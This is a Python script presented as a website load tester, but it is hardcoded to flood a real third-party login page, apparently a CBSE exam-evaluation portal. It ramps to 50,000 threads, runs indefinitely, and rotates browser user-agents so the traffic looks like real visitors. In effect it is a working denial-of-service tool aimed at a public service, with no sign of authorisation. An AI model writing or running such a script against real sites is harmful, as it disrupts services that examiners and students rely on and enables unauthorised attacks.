#!/usr/bin/python3
##########################
#  Website Load Tester   #
#  Stress Test Your Site #
##########################

import requests
import threading
import time
import random
import statistics
from datetime import datetime
import urllib3

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration - Edit for your site
TARGET_URL = "https://cbse.onmark.co.in/cbseevalweb/#/login"
CONTINUOUS_RUN = True   # Never stops - runs until Ctrl+C
RAMP_UP_TIME = 60       # Time to reach max users (1 minute)
MAX_CONCURRENT_USERS = 50000  # Maximum concurrent users
THINK_TIME = 1          # Seconds between requests per user

class LoadTester:
    def __init__(self):
        self.running = True
        self.total_requests = 0
        self.success_count = 0
        self.error_count = 0
        self.response_times = []
        self.start_time = time.time()
        self.active_users = 0
        self.lock = threading.Lock()
        
    def get_random_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        }
    
    def simulate_user(self, user_id):
        """Simulate a real user browsing the site"""
        session = requests.Session()
        
        while self.running:
            try:
                start_time = time.time()
                
                response = session.get(
                    TARGET_URL,
                    headers=self.get_random_headers(),
                    timeout=30,
                    verify=False,
                    allow_redirects=True
                )
                
                response_time = (time.time() - start_time) * 1000  # Convert to milliseconds
                
                with self.lock:
                    self.total_requests += 1
                    if response.status_code == 200:
                        self.success_count += 1
                        self.response_times.append(response_time)
                    else:
                        self.error_count += 1
                
                # Simulate user think time
                time.sleep(random.uniform(THINK_TIME * 0.5, THINK_TIME * 1.5))
                
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                    self.total_requests += 1
                
                # If connection fails, wait longer before retry
                time.sleep(5)
        
        with self.lock:
            self.active_users -= 1
    
    def ramp_up_users(self):
        """Gradually add users to simulate realistic load buildup"""
        users_per_second = MAX_CONCURRENT_USERS / RAMP_UP_TIME
        
        for i in range(MAX_CONCURRENT_USERS):
            if not self.running:
                break
                
            thread = threading.Thread(target=self.simulate_user, args=(i+1,))
            thread.daemon = True
            thread.start()
            
            with self.lock:
                self.active_users += 1
            
            print(f" [RAMP] Started user {i+1}/{MAX_CONCURRENT_USERS} | Active: {self.active_users}")
            
            if i < MAX_CONCURRENT_USERS - 1:
                time.sleep(1.0 / users_per_second)
    
    def show_real_time_stats(self):
        """Show real-time statistics"""
        while self.running:
            time.sleep(10)  # Update every 10 seconds
            
            with self.lock:
                if self.total_requests > 0:
                    success_rate = (self.success_count / self.total_requests) * 100
                    
                    if self.response_times:
                        avg_response = statistics.mean(self.response_times)
                        min_response = min(self.response_times)
                        max_response = max(self.response_times)
                        p95_response = statistics.quantiles(self.response_times, n=20)[18] if len(self.response_times) > 10 else avg_response
                    else:
                        avg_response = min_response = max_response = p95_response = 0
                    
                    elapsed = time.time() - self.start_time
                    requests_per_sec = self.total_requests / elapsed if elapsed > 0 else 0
                    hours_running = elapsed / 3600
                    
                    print(f"\\n [CONTINUOUS] Running: {hours_running:.1f}h | Active Users: {self.active_users}")
                    print(f" [STATS] Requests: {self.total_requests} | RPS: {requests_per_sec:.1f}")
                    print(f" [STATS] Success: {self.success_count} ({success_rate:.1f}%) | Errors: {self.error_count}")
                    print(f" [STATS] Response Time - Avg: {avg_response:.0f}ms | Min: {min_response:.0f}ms | Max: {max_response:.0f}ms | 95%: {p95_response:.0f}ms")
                    
                    # Performance warnings
                    if success_rate < 95:
                        print(f" [WARNING] Low success rate: {success_rate:.1f}%")
                    if avg_response > 5000:
                        print(f" [WARNING] High response time: {avg_response:.0f}ms")
    
    def start_test(self):
        print(" ╔══════════════════════════════════════╗")
        print(" ║     CONTINUOUS LOAD TESTER           ║")
        print(" ║      NEVER ENDING STRESS TEST        ║")
        print(" ╚══════════════════════════════════════╝")
        print()
        print(f" [CONFIG] Target: {TARGET_URL}")
        print(f" [CONFIG] Max Users: {MAX_CONCURRENT_USERS}")
        print(f" [CONFIG] Ramp-up Time: {RAMP_UP_TIME}s")
        print(f" [CONFIG] Mode: CONTINUOUS (never stops)")
        print(f" [CONFIG] Think Time: {THINK_TIME}s")
        print()
        print(f" [INFO] This will run FOREVER with {MAX_CONCURRENT_USERS} concurrent users")
        print(f" [INFO] Press Ctrl+C to stop anytime")
        print(f" [INFO] Starting continuous test at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        
        # Start stats monitoring
        stats_thread = threading.Thread(target=self.show_real_time_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start ramping up users
        ramp_thread = threading.Thread(target=self.ramp_up_users)
        ramp_thread.daemon = True
        ramp_thread.start()
        
        try:
            # Run continuously until interrupted
            print("\\n🔥 CONTINUOUS LOAD TEST STARTED - Will run forever until Ctrl+C")
            print("⚠️  Make sure your computer won't sleep!")
            print("📊 Stats will update every 10 seconds\\n")
            
            while True:
                time.sleep(60)  # Check every minute, but keep running
                
        except KeyboardInterrupt:
            print("\\n [INFO] Continuous test interrupted by user. Stopping...")
        
        finally:
            self.running = False
            
            # Wait a moment for threads to finish
            time.sleep(3)
            
            # Final report
            self.generate_final_report()
    
    def generate_final_report(self):
        """Generate comprehensive test report"""
        print("\\n" + "="*60)
        print("              CONTINUOUS TEST FINAL REPORT")
        print("="*60)
        
        total_time = time.time() - self.start_time
        total_hours = total_time / 3600
        
        with self.lock:
            if self.total_requests > 0:
                success_rate = (self.success_count / self.total_requests) * 100
                avg_rps = self.total_requests / total_time
                
                if self.response_times:
                    avg_response = statistics.mean(self.response_times)
                    min_response = min(self.response_times)
                    max_response = max(self.response_times)
                    sorted_times = sorted(self.response_times)
                    p50 = statistics.median(sorted_times)
                    p95 = statistics.quantiles(sorted_times, n=20)[18] if len(sorted_times) > 10 else avg_response
                    p99 = statistics.quantiles(sorted_times, n=100)[98] if len(sorted_times) > 50 else avg_response
                else:
                    avg_response = min_response = max_response = p50 = p95 = p99 = 0
            else:
                success_rate = avg_rps = 0
                avg_response = min_response = max_response = p50 = p95 = p99 = 0
        
        print(f"Test Duration: {total_hours:.1f} hours ({total_time:.1f} seconds)")
        print(f"Target URL: {TARGET_URL}")
        print(f"Max Concurrent Users: {MAX_CONCURRENT_USERS}")
        print()
        print("TRAFFIC STATISTICS:")
        print(f"  Total Requests: {self.total_requests}")
        print(f"  Successful Requests: {self.success_count}")
        print(f"  Failed Requests: {self.error_count}")
        print(f"  Success Rate: {success_rate:.2f}%")
        print(f"  Average RPS: {avg_rps:.2f}")
        print()
        print("RESPONSE TIME STATISTICS:")
        print(f"  Average: {avg_response:.0f}ms")
        print(f"  Minimum: {min_response:.0f}ms")
        print(f"  Maximum: {max_response:.0f}ms")
        print(f"  50th Percentile: {p50:.0f}ms")
        print(f"  95th Percentile: {p95:.0f}ms")
        print(f"  99th Percentile: {p99:.0f}ms")
        print()
        print("PERFORMANCE ASSESSMENT:")
        
        if success_rate >= 99:
            print("  ✅ EXCELLENT: Very high success rate")
        elif success_rate >= 95:
            print("  ✅ GOOD: High success rate")
        elif success_rate >= 90:
            print("  ⚠️  FAIR: Acceptable success rate")
        else:
            print("  ❌ POOR: Low success rate - site may be overloaded")
        
        if avg_response <= 1000:
            print("  ✅ EXCELLENT: Fast response times")
        elif avg_response <= 3000:
            print("  ✅ GOOD: Acceptable response times")
        elif avg_response <= 5000:
            print("  ⚠️  FAIR: Slow response times")
        else:
            print("  ❌ POOR: Very slow response times")
        
        if p95 <= 3000:
            print("  ✅ EXCELLENT: Good 95th percentile")
        elif p95 <= 7000:
            print("  ⚠️  FAIR: Acceptable 95th percentile")
        else:
            print("  ❌ POOR: High 95th percentile - site struggling")
        
        print("\\n" + "="*60)

if __name__ == "__main__":
    tester = LoadTester()
    tester.start_test()
